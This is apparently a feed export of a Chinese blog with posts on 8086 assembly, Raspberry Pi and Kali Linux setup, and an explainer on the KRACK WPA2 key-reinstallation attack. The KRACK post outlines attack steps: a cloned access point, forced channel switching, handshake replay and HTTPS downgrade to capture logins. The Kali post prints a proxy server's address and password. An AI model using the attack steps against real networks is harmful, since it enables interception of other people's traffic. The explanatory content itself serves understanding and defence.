    <content type="text"><![CDATA[在操作系统环境中，合法的通过操作系统取得的空间都是安全的，在操作系统允许的情况下，程序可以取得任意容量的空间 程序取得所需空间的方法有两种： 加载程序时为程序分配 程序在执行过程中向系统申请 在代码段中使用数据编程计算8个数据的和，结果存在ax寄存器中 10123h,0456h,0789h,0abch,0defh,0fedh,0cbah,0987h 方法：将这些数据存放在一组地址连续的内存单元中，通过循环将数据累加到ax中 1234567891011121314151617assume cs:codecode segment dw 0123h,0456h,0789h,0abch,0defh,0fedh,0cbah,0987h mov bx,0 mov ax,0 mov cx,8s: add ax,cs:[bx] add bx,2 loop s mov ax,4c00h int 21hcode endsend dw用于定义字型数据，即define word db用于定义字节型数据，即define byte 数据存在于代码段中，程序运行时CS存放代码段的段地址，所以从CS中得到数据的段地址 使用dw定义的数据处于代码段的最开始，所以数据的偏移地址为0，则8个数据处于代码段的偏移0、2、4、6、8、A、C、E处(每个数据是一个字，16位，一个内存单元8位)，使用bx递增2实现循环 程序从0B3D:0000开始存放 使用u命令从0B3D:0000查看程序，前16个字节为dw定义的数据，从第16个字节开始才是汇编指令所对应的机器码 此时，程序执行的入口为定义的数据，并非第一条汇编指令，在Debug中可以通过设置IP来更改指令执行位置，在系统中直接执行可执行文件可能会出现问题 可以在源程序中指明程序入口的所在,使用end指令指明程序入口在标号start处 1234567891011121314151617assume cs:codecode segment dw 0123h,0456h,0789h,0abch,0defh,0fedh,0cbah,0987hstart: mov bx,0 mov ax,0 mov cx,8s: add ax,cs:[bx] add bx,2 loop s mov ax,4c00h int 21hcode endsend start 程序框架1234567891011assume cs:codecode segment ...数据...start: ...代码...code endsend start 在代码段中使用栈利用栈，将程序中定义的数据逆序存放 可以在程序中通过定义数据来取得一段空间，然后将这段空间当作栈空间来用 12345678910111213141516171819202122232425assume cs:codesgcodesg segment dw 0123h,0456h,0789h,0abch,0defh,0fedh,0cbah,0987h dw 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0 # 定义16个字型数据，取得16个字的内存空间，将这段空间当作栈来使用start: mov ax,cs mov ss,ax mov sp,30h ;设置栈顶ss:sp指向cs:30 mov bx,0 mov cx,8s: push cs:[bx] ;将数据入栈 add bx,2 loop s mov bx,0 mov cx,8s0: pop cs:[bx] ;将数据出栈 add bx,2 loop s0 mov ax,4c00h int 21hcodesg endsend start 将数据、代码、栈放入不同的段若数据、栈、代码所需的空间超过64KB，就不能放在一个段中(8086模式中，一个段的容量不能大于64KB) 1234567891011121314151617181920212223242526272829303132333435assume cs:code,ds:data,ss:stackdata segment dw 0123h,0456h,0789h,0abch,0defh,0fedh,0cbah,0987hdata endsstack segment dw 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0stack endscode segmentstart: mov ax,stack mov ss,ax mov sp,20h mov ax,data mov ds,ax mov bx,0 mov cx,8s: push [bx] add bx,2 loop s mov bx,0 mov cx,8s0: pop [bx] add bx,2 loop s0 mov ax,4c00h int 21hcode endsend start 定义多个段的方法对于不同的段，要有不同的段名 对段地址的引用在程序中，段名相当于一个标号，代表了段地址 偏移地址要看数据在段中的位置，如0abch地址为data:6 段的安排在源程序中为段起了具有含义的名称，仅用于使程序便于阅读 assume cs:code,ds:data,ss:stack将寄存器与相应的段相连，但assume是伪指令，由编译器执行，对CPU是透明的 CPU如何处理定义的段中的内容，完全依靠程序中具体的汇编指令和汇编指令对CS:IP、SS:SP、DS等寄存器的设置来决定]]></content>
      <categories>
        <category>汇编与逆向</category>
      </categories>
      <tags>
        <tag>8086汇编语言</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[汇编语言(王爽)-[BX]和loop指令]]></title>
    <url>%2F2019%2F03%2F21%2F%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80-%E7%8E%8B%E7%88%BD-BX-%E5%92%8Cloop%E6%8C%87%E4%BB%A4%2F</url>
    <content type="text"><![CDATA[[bx]和内存单元的描述要完整的描述一个内存单元，需要两种信息： 内存单元的地址 [0]表示一个内存单元时，0表示单元的偏移地址，段地址默认在ds中 [bx]表示一个内存单元时，偏移地址在bx中，段地址在ds中 内存单元的长度(类型) 单元的长度(类型)可由具体指令中的其他操作对象(如寄存器)指出 约定描述性符号 () 表示一个寄存器或一个内存单元中存放的内容 ()中的元素有三种类型： 寄存器名 段寄存器名 内存单元的物理地址(一个20位的数据) ()所表示的数据类型有两类： 字节 字 是哪种类型由寄存器名或具体的运算决定 idata 表示常量 [BX]功能 mov ax,[bx] bx中存放的数据为偏移地址EA，段地址SA默认在ds中，将SA:EA处的数据送入ax中，即：(ax)=((ds)*16+(bx)) mov [bx],ax bx中存放的数据为偏移地址EA，段地址SA默认在ds中，将ax中的数据送入内存SA:EA处，即：((ds)*16+(bx))=(ax) loop指令格式：loop 标号 CPU执行loop指令时，要进行两步操作： (cx)=(cx)-1 判断cx中的值，不为零则转至标号处执行程序，为零则向下执行 通常，使用loop指令来实现循环功能，cx中存放循环次数 使用方法计算2^12 12345678910assume cs:codecode segment mov ax,2 mov cx,11s: add ax,ax loop s mov ax,4c00h int 21hcode endsend 在cx中存放循环次数 loop指令中的标号标识要循环执行的语句，标号所标识地址要在前面 要循环执行的程序段，要写在标号和loop指令中间 用cx和loop指令相配合实现循环功能的程序框架： 1234 mov cx,循环次数s: 循环执行的程序段 loop s 在Debug中跟踪用loop指令实现的循环程序计算ffff:0006单元中的数乘以3，结果存储在dx中 1234567891011121314151617181920assume cs:codecode segment mov ax,0ffffh mov ds,ax mov bx,6 ;以上，设置ds:bx指向ffff:0006 mov al,[bx] mov ah,0 ;以上，设置(al)=((ds*16)+(bx)),(ah)=0 mov dx,0 ;累加寄存器清0 mov cx,3 ;循环3次s: add dx,ax loop s ;以上累加计算(ax)*3 mov ax,4c00h int 21h ;程序返回 code endsend 程序中第一条指令mov ax,0ffffh，在汇编源程序中，数据不能以字母开头，所以在前面加0 (ds)=0b3dh，则程序在0b3d:0处(程序内存前存在256个字节的程序段前缀) (cs)=0b3dh,(IP)=0指向程序的第一条指令 使用u命令查看被Debug加载入内存的程序，此时，loop s已变为loop 0012h,用于实现跳转 程序执行结束 可以使用g命令跳过某些不想单步执行的代码段，g 0012将使Debug从当前的CS:IP指向的指令开始执行，一直到(IP)=0012h为止 可以使用p命令来让Debug自动重复执行循环中的指令，直到(cx)=0为止 使用g命令同样可以达到跳过循环过程的效果 Debug和汇编编译器masm对指令的不同处理对于类似mov ax,[0]的汇编指令 在Debug中，表示将ds:0内存单元处的数据送入ax中 在masm中，被当作mov ax,0处理，表示将ax寄存器赋值为0 汇编源程序中以下指令的含义： mov al,[0]：(al)=0，将常量0送入al中 mov al,ds:[0]：(al)=((ds)*16+0)，将内存单元中的数据送入al中 mov al,[bx]：(al)=((ds)*16+(bx))，将内存单元中的数据送入al中 mov al,ds:[bx]：与mov al,[bx]含义相同 如何实现在源程序中将内存单元中的数据送入寄存器呢？ 使用bx，间接给出内存单元的偏移地址，则段地址默认存储在ds中 1234mov ax,2000hmov ds,axmov bx,0mov al,[bx] 在汇编源程序中，若在[]中用一个常量直接给出内存单元的偏移地址，需在[]前显式的给出段地址所在的段寄存器，如：mov al,ds:[0] loop与[bx]的联合应用计算ffff:0-ffff:b单元中的数据的和，结果存储在dx中 问题： 结果是否会超出dx范围 一个存储单元存储一个字节数据，范围在0-255，12个字节型数据相加，结果不大于65535，不会超出存储范围 能否将数据直接累加到dx中 不行，内存单元数据为8位，不可直接累加到16位寄存器中 能否将内存单元中数据累加到dl中，设置(dh)=0，实现累加 不行，会出现进位丢失 可使用一个16位寄存器做中介，将内存单元中的数据送入16位寄存器ax中，再将ax中数据加到dx中，实现运算对象类型匹配且结果不会超界 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061assume cs:codecode segment mov ax,0ffffh mov ds,ax mov dx,0 mov al,ds:[0] mov ah,0 add dx,ax mov al,ds:[1] mov ah,0 add dx,ax mov al,ds:[2] mov ah,0 add dx,ax mov al,ds:[3] mov ah,0 add dx,ax mov al,ds:[4] mov ah,0 add dx,ax mov al,ds:[5] mov ah,0 add dx,ax mov al,ds:[6] mov ah,0 add dx,ax mov al,ds:[7] mov ah,0 add dx,ax mov al,ds:[8] mov ah,0 add dx,ax mov al,ds:[9] mov ah,0 add dx,ax mov al,ds:[0ah] mov ah,0 add dx,ax mov al,ds:[0bh] mov ah,0 add dx,ax mov ax,4c00h int 21h code endsend 使用loop指令，使程序更简洁 12345678910111213141516171819202122assume cs:codecode segment mov ax,0ffffh mov ds,ax mov bx,0 mov dx,0 mov cx,12 s: mov al,[bx] mov ah,0 add dx,ax inc bx ;bx中的值自加1，使ds:bx指向下一个单元 loop s mov ax,4c00h int 21h code endsend 段前缀如：mov ax,ds:[bx]，出现在访问内存单元的指令中，用于显式指明内存单元的段地址的ds等，在汇编语言中称为段前缀 一段安全的空间在8086模式中，随意向一段内存空间中写入内容是非常危险的，因为这段空间中可能存放着重要的系统数据或代码 在纯DOS方式(实模式)下，可直接使用汇编语言去操作真实的硬件，因为在CPU实模式下的DOS，没有能力对硬件系统进行全面、严格的管理 在运行于CPU保护模式下的操作系统中，无法用汇编语言去操作真实的硬件，硬件已被操作系统利用CPU保护模式所提供的功能全面而严格的管理了 总结 我们需要直接向一段内存中写入内容 这段内存空间不应该存放系统或其他程序的数据或代码，否则写入操作可能引发错误 DOS方式下，一般情况，0:200-0:2ff空间中没有系统或其他程序的数据或代码 在使用内存空间时，可使用Debug查看内存空间是否被使用 段前缀的使用将内存ffff:0-ffff:b单元中的数据复制到0:200-0:20b单元中 0:200-0:20b单元等同于0020:0-0020:b单元，它们描述的是同一段内存空间 123456789101112131415161718192021assume cs:codecode segment mov bx,0 ;偏移地址从0开始 mov cx,12 ;循环次数12s: mov ax,0ffffh ;循环开始，设置ax mov ds,ax ;设置源段地址 mov dl,[bx] ;将源内存单元数据赋值到dl中 mov ax,0020h ;重新设置ax mov ds,ax ;设置目的段地址 mov [bx],dl ;将dl中的数据赋值到目的内存单元中 inc bx ;bx自加1，用于下一单元数据复制 loop s mov ax,4c00h ;程序返回 int 21h code endsend 程序中使用dl寄存器作为中介进行数据复制 每次循环需要设置两次ds，用于切换源段地址与目的段地址，源内存单元与目的内存单元相距大于64KB，效率不高，可以设置两个段寄存器，分别用于存放源段地址与目的段地址，即可省略每次循环需设置两次ds的操作 1234567891011121314151617181920212223assume cs:codecode segment mov ax,0ffffh ;设置ax mov ds,ax ;设置源段地址 mov ax,0020h ;设置ax mov es,ax ;设置目的段地址 mov bx,0 ;设置逻辑地址bx mov cx,12 ;设置循环次数 s: mov dl,[bx] ;将源内存单元数据赋值给dl，默认段地址在ds中 mov es:[bx],dl ;将dl中值赋值给目的内存单元 inc bx ;bx自加1，用于下一内存单元数据复制(源段地址与目的段地址共用一个逻辑地址) loop s mov ax,4c00h ;程序返回 int 21h code endsend]]></content>
      <categories>
        <category>汇编与逆向</category>
      </categories>
      <tags>
        <tag>8086汇编语言</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Raspberry Pi 3 B+入门]]></title>
    <url>%2F2019%2F03%2F21%2FRaspberry-Pi-3-B-%E5%85%A5%E9%97%A8%2F</url>
    <content type="text"><![CDATA[简介Raspberry Pi(中文名为“树莓派”,简写为RPi，(或者RasPi/RPI)。是为学习计算机编程教育而设计)，只有信用卡大小的微型电脑，其系统基于Linux。随着Windows 10 IoT的发布，我们也将可以用上运行Windows的Raspberry Pi。 它是一款基于ARM的微型电脑主板，以SD/MicroSD卡为内存硬盘，卡片主板周围有1/2/4个USB接口和一个10/100以太网接口（A型没有网口），可连接键盘、鼠标和网线，同时拥有视频模拟信号的电视输出接口和HDMI高清视频输出接口，以上部件全部整合在一张仅比信用卡稍大的主板上，具备所有PC的基本功能只需接通电视机和键盘，就能执行如电子表格、文字处理、玩游戏、播放高清视频等诸多功能。Raspberry Pi B款只提供电脑板，无内存、电源、键盘、机箱或连线。 Raspberry Pi 3 B+博通BCM2837B0 SoC，集成四核ARM Cortex-A53（ARMv8）64位@ 1.4GHz CPU，集成博通 Videocore-IV GPU 内存：1GB LPDDR2 SDRAM 有线网络：千兆以太网（通过USB2.0通道，最大吞吐量300Mbps） 无线网络:2.4GHz和5GHz双频Wi-Fi，支持802.11b/g/n/ac 蓝牙：蓝牙4.2低功耗蓝牙（BLE） 存储：Micro-SD 其他接口：HDMI，3.5mm模拟音频视频插孔，4xUSB2.0，以太网，摄像机串行接口（CSI），显示器串行接口（DSI），MicroSD卡座，40pin扩展双排插针 尺寸：82mmx 56mmx 19.5mm，50克 准备配件Raspberry Pi 3 B+ 散热贴：Raspberry Pi 3 B+版本的CPU自带散热，官方不建议外置散热贴 外壳 网线 电源线(5V-2A) TF卡(8G以上) TF卡读卡器 显示屏(可选) Windows下安装进入系统系统下载系统镜像下载：https://www.raspberrypi.org/downloads/ 系统烧录烧录软件：Win32DiskImager 系统镜像：.img文件 烧录完成后，在TF卡的boot分区下新建ssh文件，用于开启系统SSH服务(此服务默认关闭) 无显示屏进入系统连接网络将TF卡插入Raspberry Pi 3 B+，连接电源，红灯常亮表示电源正常，绿灯闪烁表示正在读取TF卡 将网线两端连接Raspberry Pi 3 B+与笔记本，网口灯亮起 设置笔记本网络连接(笔记本无线连接互联网，有线连接Raspberry Pi 3 B+) 查找Raspberry Pi 3 B+的IP笔记本cmd执行 1arp -a 对比连接Raspberry Pi 3 B+与未连接Raspberry Pi 3 B+的ARP地址变化，新增的IP即为Raspberry Pi 3 B+的IP,通常Raspberry Pi 3 B+的MAC地址为b8开头 ssh连接Raspberry Pi 3 B+使用xshell连接Raspberry Pi 3 B+22端口 默认用户名：pi 默认密码：raspberry 系统的一些配置设置中文显示 安装中文字体 12sudo apt updatesudo apt install ttf-wqy-zenhei 设置中文显示 1sudo raspi-config 语言选择zh_CN.UTF-8，然后下一屏幕默认语言选zh_CN.UTF-8 提示： 空格键为打勾或去掉勾，Tab键切换光标位置。 安装中文输入法 1sudo apt install scim-pinyin 输入法切换热键是Ctrl+空格 重启生效 1sudo init 6 使用Windows远程桌面连接Raspberry Pi 3 B+Raspberry Pi 3 B+安装rdp服务 1sudo apt-get install xrdp 使用Windows远程桌面连接 设置无线连接首次设置会提示选择无线网络所在国家，之后开启无线即可 不建议使用配置文件设置WiFi,会出现无法连接，无线无法使用的情况发生 WiFi配置文件/etc/wpa_supplicant/wpa_supplicant.conf 123456789101112131415ctrl_interface=DIR=/var/run/wpa_supplicant GROUP=netdevupdate_config=1country=CNnetwork=&#123; ssid=&quot;&quot; psk=&quot;&quot; key_mgmt=WPA-PSK&#125;ssid：无线热点名称psk：身份认证信息，即无线密码key_mgmt：无线加密方式，分为WPA-PSK或NONEpriority：连接优先级，越大越优先scan_ssid：连接隐藏WiFi时需要指定该值为1 安卓手机连接Raspberry Pi 3 B+使用VNCRaspberry Pi 3 B+安装VNC 1sudo apt install tightvncserver 启动Raspberry Pi 3 B+的VNC，并设置连接密码,，密码少可小于8位 1tightvncserver 手机使用VNC软件连接Raspberry Pi 3 B+5901端口即可 使用ssh推荐安卓端软件：JuiceSSH 设置静态IP连接WiFi 编辑配置文件 123456789sudo vim /etc/dhcpcd.conf在文件结尾处添加如下代码interface wlan0static ip_address=你的内网ip地址/24static routers=内网网关ip地址static domain_name_servers=114.114.114.114 #自定义dns 重启生效 1sudo init 6 使用Raspberry Pi 3 B+无线网卡创建AP使用的GitHub上一个开源项目 copy代码到本地 1sudo git clone https://github.com/oblique/create_ap 安装 12cd create_apsudo make install 安装依赖的库 1sudo apt-get install util-linux procps hostapd iproute2 iw haveged dnsmasq 创建热点 创建桥接热点，实现设备无线连接Raspberry Pi 3 B+，通过Raspberry Pi 3 B+与电脑的有线连接上网1sudo create_ap -w 2 wlan0 eth0 热点名 密码 创建非桥接热点，设备无线连接Raspberry Pi 3 B+，无法连接互联网，用于在无网络环境下配置Raspberry Pi 3 B+ 1sudo create_ap -w 2 -n wlan0 热点名 密码 编写脚本，用于开机判断启动何种热点 1234567891011ap.sh#!/bin/bashstrA=`ifconfig eth0 | awk &apos;NR==2&#123;print&#125;&apos;`strB=&quot;inet&quot;if [[ $strA =~ $strB ]]then sudo create_ap -w 2 wlan0 eth0 热点名 密码else sudo create_ap -w 2 -n wlan0 热点名 密码fi 加入开机自启 12sudo vim /etc/rc.local./home/pi/ap.sh &amp; # 在exit 0 之前加入 当Raspberry Pi 3 B+启动之后，若设置的自动连接WiFi存在，则会首先连接存在的WiFi，不会创建AP。反之，则会创建AP，用于ssh连接Raspberry Pi 3 B+进行配置或通过Raspberry Pi 3 B+桥接接入互联网。当可连接WiFi出现，Raspberry Pi 3 B+则会放弃自建AP，去链接WiFi。之后若WiFi断开，Raspberry Pi 3 B+则不会再次进行AP的创建 恢复TF卡存储容量使用Win32DiskImager进行系统烧录后，TF卡会被分区，无法直接访问 格式化TF卡并恢复容量： 以管理员方式打开cmd 输入DISKPART 选择要恢复的磁盘 1DISKPART&gt; select disk 1 删除磁盘 1DISKPART&gt; clean 创建主磁盘分区 1DISKPART&gt;CREATE PARTITION PRIMARY 激活磁盘分区 1DISKPART&gt; active 以FAT32格式快速格式化磁盘分区 1DISKPART&gt;FORMAT FS=FAT32 QUICK 参考链接 http://shumeipai.nxez.com/2014/09/30/raspberry-pi-led-status-detail.html https://blog.csdn.net/dear521520/article/details/78357705 https://baijiahao.baidu.com/s?id=1593271416962187624&amp;wfr=spider&amp;for=pc https://www.cnblogs.com/playboysnow/p/4987103.html https://blog.csdn.net/yalecaltech/article/details/79480533 https://blog.csdn.net/qq_21768483/article/details/82944874 https://www.cnblogs.com/zhangyuejia/p/8945354.html]]></content>
      <categories>
        <category>硬件安全</category>
      </categories>
      <tags>
        <tag>树莓派</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[无线安全之KRACK攻击]]></title>
    <url>%2F2019%2F03%2F16%2F%E6%97%A0%E7%BA%BF%E5%AE%89%E5%85%A8%E4%B9%8BKRACK%E6%94%BB%E5%87%BB%2F</url>
    <content type="text"><![CDATA[KRACK攻击简介密钥重安装攻击(Key Reinstallation Atacks) KRACK的攻击对象包括客户端和AP，针对的是两方在密钥认证结束后的以协商消息加密密钥为目的的四次握手阶段 对AP密码无直接威胁，而对客户端与AP连接后进行交互的过程具有直接威胁 目的 拦截并解密通过无线网络传输的数据 使用拦截到的数据包进行重放攻击 进行伪造数据包攻击 实施攻击的条件 攻击者可以连接到被攻击的AP 能够进行中间人攻击 影响范围WPA1及WPA2 个人及企业网络 Ciphers WPA-TKIP, AES-CCMP 和 GCMP 攻击详情分析客户端与AP进行四次握手阶段和组密钥握手阶段 当客户端试图连接到一个受保护的WiFi网络时，AP将会发起四次握手，完成相互认证。 四步握手认证过程： AP发送Anonce给STATION，STATION生成Snonce，通过这两个随机数与其他信息即可计算出PTK STATION将Snonce与PTK的MIC(完整性校验)发送给AP，AP拿到Snonce，计算出PTK。后进行双方PTK的MIC校验，既可校验PTK，又可判断PMK，进一步可判断PSK AP发送GTK与GTK的MIC给STATION STATION针对GTK会使用另外的算法进行计算，校验。无误后向AP回复ACK并使用密钥加密 在四次握手过程中，当客户端收到AP发来的GTK+MIC后将会安装加密密钥key，用于加密正常的数据帧。 因为GTK+MIC可能丢失或者被丢弃，如果AP没有收到客户端的响应，AP将会重新传输GTK+MIC，这样客户端可能会收到多次GTK+MIC。客户端每次收到此GTK+MIC都会重新安装加密key，从而重置加密协议使用的增量发送数据包nonce和接收重放计数器。而攻击者可以通过收集和重放发送四次握手中的GTK+MIC强制重置nonce，从而成功攻击加密协议，解密客户端发送通信数据包，截获敏感信息。 另外，这一漏洞似乎是由WiFi标准中的一句话引起的。该标准建议，一旦首次安装，就可以从内存中清除加密密钥。当客户端收到四次握手的重传GTK+MIC时，它将重新安装现已清除的加密密钥，有效地安装了一个全为零的密钥 攻击演示论文地址：https://www.krackattacks.com/ 视频连接：https://youtu.be/Oh4WURZoR98 首先被攻击客户端设备连接真实的TestNetWork网络 开启WireShark并监听在伪造AP的网卡 真实AP：ssid： testnetwork，MAC：bc:ae:c5:88:8c:20，Channel：6 被攻击客户端：MAC: 90:18:7c:6e:6b:20 伪造同名同MAC热点：ssid： testnetwork，MAC：bc:ae:c5:88:8c:20，Channel：1 注入CSA beaconpairs将客户端信道变为1，迫使客户端与伪造AP通信 伪造AP向目标客户端发送Disassociate数据包，使其解除关联。 经过上述步骤，此时设备经历重连，WiFI状态为正在认证 当目标targe与真实AP完成认证过程，准备发起连接时，注入CSA beacon pairs，使信道切换到channel 1实施中间人攻击，同时客户端状态保持在state 2，接下来开始发送四次握手中的GTK+MIC，实施密钥重新安装（Key Reinstallation Attack）攻击 此时密钥重装攻击已经执行成功，客户端已连接上伪造热点 在此伪造热点中，使用SSstrip使HTTPS降级 用户在网站提交的账号信息可被攻击者获取 测试工具https://github.com/vanhoefm/krackattacks-scripts 参考链接https://www.freebuf.com/articles/wireless/150953.html https://www.freebuf.com/articles/wireless/153323.html https://www.freebuf.com/articles/wireless/153324.html https://blog.csdn.net/xuqi7/article/details/78346045 https://www.krackattacks.com/]]></content>
      <categories>
        <category>无线电安全</category>
      </categories>
      <tags>
        <tag>WPA/WPA2安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Raspberry Pi 3 B+之Kali Linux入门]]></title>
    <url>%2F2019%2F03%2F15%2FRaspberry-Pi-3-B-%E4%B9%8BKali-Linux%E5%85%A5%E9%97%A8%2F</url>
    <content type="text"><![CDATA[开机后的基本系统配置Kali Linux汉化 安装中文字体 1apt install ttf-wqy-zenhei 设置中文 1dpkg-reconfigure locales 选择en_US.UTF-8、zh_CN.GBK、zh_CN.UTF-8，下一屏选择zh_CN.UTF-8(空格选中，Tab切换) 重启生效 1init 6 修改时间与时区(debian系列) 查看当前系统时区 1date -R 修改时区 1tzselect 选择亚洲 选择中国 选择北京 YES 配置系统变量 1234vim /etc/profile添加export TZ=&apos;Asia/Shanghai&apos; 配置生效,验证 12source /etc/profiledate -R 无线wifi配置 配置wpa_supplicant.conf 12cd /etc/wpa_supplicant/wpa_passphrase &quot;ssid&quot; &quot;12345678&quot; &gt; wpa_supplicant.conf 配置interfaces 1234567vim /etc/network/interfacesauto wlan0allow-hotplug wlan0iface wlan0 inet manualwpa-roam /etc/wpa_supplicant/wpa_supplicant.confiface default inet dhcp 重启生效 1init 6 设置静态IP12345678vim /etc/network/interfacesauto eth0iface eth0 inet static # 启用静态IPaddress 192.168.0.11 # 设置IPnetmask 255.255.255.0 # 设置掩码gateway 192.168.0.1 # 设置网关 设置DNS1234vim /etc/resolv.confnameserver 8.8.8.8nameserver 114.114.114.114 设置ss 安装shadowsocks 1pip install shadowsocks 编辑shadowsocks配置文件 1234567891011vim ss.json &#123; &quot;server&quot;:&quot;103.114.161.158&quot;, &quot;local_address&quot;: &quot;127.0.0.1&quot;, &quot;local_port&quot;:1080, &quot;server_port&quot;:443, &quot;password&quot;:&quot;dongtaiwang.com&quot;, &quot;timeout&quot;:300, &quot;method&quot;:&quot;aes-256-cfb&quot;&#125; 启动shadowsocks客户端 1sslocal -c ss.json 启动报错： 解决方案： 1vim /usr/local/lib/python2.7/dist-packages/shadowsocks/crypto/openssl.py 将libcrypto.EVP_CIPHER_CTX_cleanup.argtypes = (c_void_p,)改为libcrypto.EVP_CIPHER_CTX_reset.argtypes = (c_void_p,) 将libcrypto.EVP_CIPHER_CTX_cleanup(self._ctx)改为libcrypto.EVP_CIPHER_CTX_reset(self._ctx) 重新启动shadowsocks客户端 privoxy 由于shadowsocks是socket5代理，在shell中发起的请求只能使用http/https代理，所以需要安装privoxy代理，将shell中的http请求转发给shadowsocks 安装privoxy 1apt install privoxy 配置privoxy 1vim /etc/privoxy/config 在enable-proxy-authentication-forwarding 0后添加 1forward-socks5 / 127.0.0.1:1080 . 添加环境变量 1234vim ~/.bashrc 添加export http_proxy=https://127.0.0.1:8118/ 配置文件生效 1source ~/.bashrc 启动 1privoxy /etc/privoxy/config 此时通过shell的流量都会进行代理 参考链接http://tieba.baidu.com/p/4593492218 https://jingyan.baidu.com/article/fec7a1e5ec8e341191b4e75f.html https://www.jianshu.com/p/008b483113ce]]></content>
      <categories>
        <category>硬件安全</category>
      </categories>
      <tags>
        <tag>树莓派</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[汇编语言(王爽)-第一个程序]]></title>
    <url>%2F2019%2F03%2F06%2F%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80-%E7%8E%8B%E7%88%BD-%E7%AC%AC%E4%B8%80%E4%B8%AA%E7%A8%8B%E5%BA%8F%2F</url>
    <content type="text"><![CDATA[一个源程序从写出到执行的过程 编写汇编源程序 产生存储源程序的文本文件 对源程序进行编译连接 使用汇编语言编译程序对源程序文本文件进行编译，产生目标文件 使用连接程序对目标文件进行连接，生成可执行文件 可执行文件中包含： 程序(汇编指令翻译成的机器码)和数据(源程序中定义的数据) 相关描述信息 执行可执行文件中的程序 由操作系统依照可执行文件中的描述信息，将可执行文件中的机器码和数据加载入内存，并进行相关的初始化，然后由CPU执行程序 源程序123456789101112131415assume cs:codesgcodesg segment mov ax,0123H mov bx,0456H add ax,bx add ax,bx mov ax,4c00H int 21H codesg endsend 伪指令汇编语言源程序中，包含两种指令，一种是汇编指令，一种是伪指令 汇编指令可被编译为机器指令，被CPU执行 伪指令由编译器执行，编译器根据伪指令来进行相关编译工作 segment–endssegment和ends成对出现，功能是定义一个段，一个段必须有一个名称来标识 格式： 12345段名 segment...段名 ends 一个汇编程序由多个段组成，用于存放代码、数据或当作栈空间来使用 一个有意义的汇编程序中至少要有一个段，用于存放代码 end汇编语言的结束标记 当碰到伪指令end，就结束对源程序的编译 assume用于假设某一段寄存器和程序中的某一个用segment--ends定义的段相关联，通过assume说明这种关联 源程序中的“程序”可以将源程序文件中的所有内容称为源程序，将源程序中最终由计算机执行、处理的指令或数据，称为程序 程序最先以汇编指令的形式存在源程序中，经编译、连接后转变为机器码，存储在可执行文件中 标号如codesg，一个标号指代一个地址 段名称最终将被编译、连接程序处理为一个段的段地址 程序的结构源程序是由一些段构成的。可以在这些段中存放代码、数据、或将某个段当作栈空间 编程运算2^3 定义一个段 123abc segment...abc ends 在段中写入汇编指令 1234567abc segment mov ax,2 add ax,ax add ax,axabc ends 指出程序何处结束 123456789abc segment mov ax,2 add ax,ax add ax,ax abc endsend abc段被当作代码段来使用，所以，应将abc和cs联系起来 1234567891011assume cs:abcabc segment mov ax,2 add ax,ax add ax,ax abc endsend 程序返回一个程序结束后，将CPU的控制权交还给使它得以运行的程序，被称为程序返回 在程序的末尾添加返回的程序段 12mov ax,4c00Hint 21H 语法错误和逻辑错误程序在编译时被编译器发现的错误是语法错误，例：拼写错误 在源程序编译后，在运行时发生的错误是逻辑错误，例：无程序返回 编辑源程序可以用任意的文本编辑器来编辑源程序，只要最终将其存储为纯文本文件即可 编译对源程序进行编辑后，得到源程序文件c:\1.asm 采用微软masm5.0汇编编译器 运行masm.exe 输入c:\1.asm（默认后缀为.asm） 输出.obj文件 默认输出1.obj，可自定义输出目录 输入列表文件名称 列表文件(.lst)是将源程序编译为目标文件过程中产生的中间结果，Enter跳过 输入交叉引用文件的名称 交叉引用文件(.crf)同列表文件用途相同，Enter跳过 编译完成 生成.obj目标文件 编译器输出的最后两行表示源程序无警告错误和必须要改正的错误 一般来说，有两类错误使我们得不到所期望的目标文件： 程序中有必须要改正的错误 找不到所给出的源程序文件 连接对源程序进行编译得到目标文件之后，需对目标文件进行连接，从而得到可执行文件 使用微软Overlay Linker 3.60连接器 运行link.exe 输入1（默认后缀.obj） 输入可执行文件名称 输入映像文件名称 映像文件是连接程序将目标文件连接为可执行文件过程中产生的中间结果，Enter跳过 输入库文件名称 库文件中包含一些可以调用的子程序，若程序中调用了某一库文件中的子程序，则在连接中，需将库文件与目标文件进行连接，生成可执行文件，Enter跳过 生成可执行文件 在当前路径下，出现1.exe，这是对目标文件1.obj进行连接所得到的结果 若连接过程中出现错误，将得不到可执行文件 连接的作用 当源程序很大时，可以将它分为多个源程序文件进行编译，每个源程序编译成目标文件之后，再用连接程序将它们连接到一起，生成一个可执行文件 若程序中调用了某个库文件中的子程序，需将这个库文件和该程序生成的目标文件连接到一起，生成一个可执行文件 在只有一个源程序文件，而又不需要调用某个库中的子程序的情况下，也必须用连接程序对目标文件进行处理，生成可执行文件 以简化的方式进行编译和连接1masm c:\1; 生成目标文件1.obj，并在编译过程中自动忽略中间文件的生成 1link 1; 生成可执行文件1.exe，并在过程中自动忽略中间文件的生成 1.exe的执行 程序执行，无输出 谁将可执行文件中的程序装载进内存并使它运行操作系统的外壳任何通用的操作系统，都要提供一个称为shell(外壳)的程序，供用户使用这个程序来操作计算机系统进行工作 DOS中有一个程序command.com，在DOS中称为命令解释器，也就是DOS的shell DOS启动后，初始化后，运行command.com，在屏幕上显示盘符和路径组成的提示符 用户所输入的所要执行的命令，由command执行，完成后，显示结果并再次出现提示符，等待用户输入 用户执行程序，输入可执行文件名称，command首先根据文件名找到可执行文件，然后将这个可执行文件中的程序加载入内存，设置CS:IP指向程序入口。之后，command暂停运行，CPU运行程序。程序运行结束后，返回到command中，command再次显示提示符，等待用户的输入 在DOS中，command处理各种输入(命令或可执行文件)。我们通过command来进行工作 程序执行过程 在DOS中执行1.exe，是正在运行的command将1.exe加载入内存的 command设置CPU的CS:IP指向程序的第一条指令(程序入口)，使程序运行 程序运行结束后，返回到command中，CPU继续运行command 汇编语言从写出到执行的过程 程序执行过程的跟踪为了观察程序的运行过程，可以使用Debug。Debug可以将程序加载入内存，设置CS:IP指向程序入口，但Debug并不放弃对CPU的控制，这样，可以使用Debug的相关命令来单步执行程序，查看每一条指令的执行结果 